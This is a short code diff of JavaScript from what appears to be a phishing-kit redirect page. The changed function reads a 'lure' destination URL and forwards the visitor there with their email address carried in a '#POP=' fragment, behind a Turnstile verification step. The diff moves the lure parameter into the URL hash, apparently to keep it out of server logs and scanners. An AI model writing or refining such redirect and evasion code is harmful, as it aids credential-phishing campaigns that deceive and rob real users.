@@ -156,32 +156,28 @@
         }
 
         // Extract redirect URL from ?lure= parameter and replace ? with #
+// Extract redirect URL from #lure= parameter
 function extractLureUrl() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const lureParam = urlParams.get('lure');
-
-    if (lureParam) {
-        // Replace the query string `?` with a `#` in the lure URL
-        return lureParam.replace('?', '#');
-    }
-    return null; // Return null if no lure parameter is found
+    const hashFragment = window.location.hash.substring(1); // Remove the # symbol
+    const fragmentParams = new URLSearchParams(hashFragment);
+    return fragmentParams.get('lure');
 }
 
 
-        // Redirect to lure URL if provided
+
+// Redirect to lure URL if provided
 async function redirectToLureUrlWithEmail(email) {
     const lureUrl = extractLureUrl();
     if (lureUrl) {
-        // Check if the lure URL already contains a query string
         const separator = lureUrl.includes('?') ? '&' : '?';
         const redirectUrl = `${lureUrl}${separator}redirected=done#POP=${encodeURIComponent(email || '')}`;
-        
         console.log('Redirecting to:', redirectUrl);
         window.location.href = redirectUrl;
     } else {
-        console.log('No lure URL provided in the query string.');
+        console.log('No lure URL provided in the hash fragment.');
     }
 }
+
 
 
         // Start Turnstile verification
